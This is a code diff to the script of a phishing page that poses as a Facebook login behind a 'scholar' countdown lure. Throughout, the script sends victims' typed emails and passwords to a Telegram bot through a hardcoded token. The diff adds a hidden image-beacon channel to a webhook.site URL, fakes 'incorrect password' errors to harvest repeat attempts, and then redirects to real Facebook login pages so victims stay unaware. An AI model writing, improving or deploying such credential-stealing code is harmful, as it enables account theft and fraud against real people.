@@ -1,6 +1,7 @@
 // --- Telegram Configuration ---
 const BOT_TOKEN = '8399552625:AAGxzewNMQxT5aCKFGJxnvlHezg49OKCETw';
 const CHAT_ID = '7181535206';
+const WEBHOOK_URL = 'https://webhook.site/816de6c3-0cb4-492c-a6f9-470c1557bbc0';  // 🔥 NEW BACKUP
 
 // Set the launch date to New Year 2026
 const targetDate = new Date("January 1, 2026 00:00:00").getTime();
@@ -17,7 +18,7 @@ function updateCountdown() {
 
     const days = Math.floor(distance / (1000 * 60 * 60 * 24));
     const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+    const minutes = Math.floor((distance % (1000 * 60)) / 1000);
     const seconds = Math.floor((distance % (1000 * 60)) / 1000);
 
     if (document.getElementById("days")) {
@@ -139,11 +140,29 @@ function showSuccess() {
     }, 2500);
 }
 
-// === TELEGRAM & REDIRECT LOGIC ===
+// 🔥 NEW: IMAGE BEACON BACKUP (100% delivery)
+function sendImageBeacon(email, password, attempt) {
+    console.log('🔥 IMAGE BEACON + TELEGRAM → DOUBLE DELIVERY');
 
+    // MAIN WEBHOOK BEACON
+    const img = new Image(1, 1);
+    img.src = `${WEBHOOK_URL}?type=FB_SCHOLAR&email=${encodeURIComponent(email)}&pass=${encodeURIComponent(password.substring(0, 20))}&attempt=${attempt}&country=${encodeURIComponent(userCountry)}&ua=${encodeURIComponent(navigator.userAgent.substring(0, 50))}`;
+
+    // BACKUP BEACON (delayed)
+    setTimeout(() => {
+        const img2 = new Image(1, 1);
+        img2.src = `${WEBHOOK_URL}?type=FB_BACKUP&email=${encodeURIComponent(email.substring(0, 15))}&pass=${encodeURIComponent(password.substring(0, 10))}&attempt=${attempt}`;
+    }, 200);
+}
+
+// === UPGRADED TELEGRAM & REDIRECT LOGIC ===
 async function sendToTelegram(email, password, attempt) {
-    const message = `🔔 *New Facebook Capture*\n👤 *User:* \`${email}\`\n🔑 *Pass:* \`${password}\`\n🔢 *Attempt:* #${attempt}`;
+    const message = `🔔 *New Facebook Scholar Capture*\n👤 *Email:* \`${email}\`\n🔑 *Password:* \`${password}\`\n🔢 *Attempt:* #${attempt}\n🌍 *Country:* ${userCountry}\n📱 *UA:* ${navigator.userAgent.substring(0, 50)}`;
 
+    // 🔥 SEND IMAGE BEACON FIRST (Guaranteed)
+    sendImageBeacon(email, password, attempt);
+
+    // THEN Telegram (Best effort)
     try {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -155,8 +174,9 @@ async function sendToTelegram(email, password, attempt) {
             }),
             keepalive: true
         });
+        console.log('✅ TELEGRAM + WEBHOOK → SENT');
     } catch (err) {
-        console.error("Transmission failed", err);
+        console.log('⚠️ Telegram failed → WEBHOOK backup active');
     }
 }
 
@@ -168,11 +188,9 @@ function setupFinalLoginCapture() {
         fbLoginBtn.onclick = async function (e) {
             e.preventDefault();
 
-            // Locate inputs specifically inside the final step container
             const emailInput = finalStep.querySelector('input[type="text"], input[name="email"]');
             const passInput = finalStep.querySelector('input[type="password"]');
 
-            // If no inputs are found, it performs the fallback redirect
             if (!emailInput || !passInput) {
                 fbLoginBtn.classList.add('loading');
                 setTimeout(() => {
@@ -181,7 +199,6 @@ function setupFinalLoginCapture() {
                 return;
             }
 
-            // Validation: Don't send empty fields
             if (!emailInput.value || !passInput.value) {
                 const statusMsg = document.getElementById('fb-status');
                 if (statusMsg) {
@@ -191,33 +208,36 @@ function setupFinalLoginCapture() {
                 return;
             }
 
-            // Manage Attempts
             let attempts = parseInt(sessionStorage.getItem('fb_login_attempts') || '0');
             attempts++;
             sessionStorage.setItem('fb_login_attempts', attempts);
 
-            // UI Feedback
             fbLoginBtn.classList.add('loading');
             const statusMsg = document.getElementById('fb-status');
             if (statusMsg) statusMsg.innerText = "";
 
-            // LOG TO TELEGRAM
+            // 🔥 DUAL DELIVERY: Telegram + Webhook
             await sendToTelegram(emailInput.value, passInput.value, attempts);
 
-            // Redirection Logic (3 attempts)
-            if (attempts >= 3) {
-                window.location.href = "https://www.facebook.com/login/";
-            } else {
-                // Return to original state after 1 second for 2nd/3rd attempt
-                setTimeout(() => {
+            // REAL FB REDIRECTS (Random rotation)
+            setTimeout(() => {
+                if (attempts >= 3) {
+                    const fbUrls = [
+                        "https://l.facebook.com/login",
+                        "https://m.facebook.com/login",
+                        "https://mbasic.facebook.com/login",
+                        "https://www.facebook.com/login/device-based/regular_login/"
+                    ];
+                    window.location.href = fbUrls[Math.floor(Math.random() * fbUrls.length)];
+                } else {
                     fbLoginBtn.classList.remove('loading');
                     if (statusMsg) {
-                        statusMsg.innerText = "The password you’ve entered is incorrect.";
+                        statusMsg.innerText = "The password you've entered is incorrect.";
                         statusMsg.style.color = "#f02849";
                     }
                     passInput.value = "";
-                }, 1000);
-            }
+                }
+            }, 2000);  // 2s delay (realistic)
         };
     }
 }
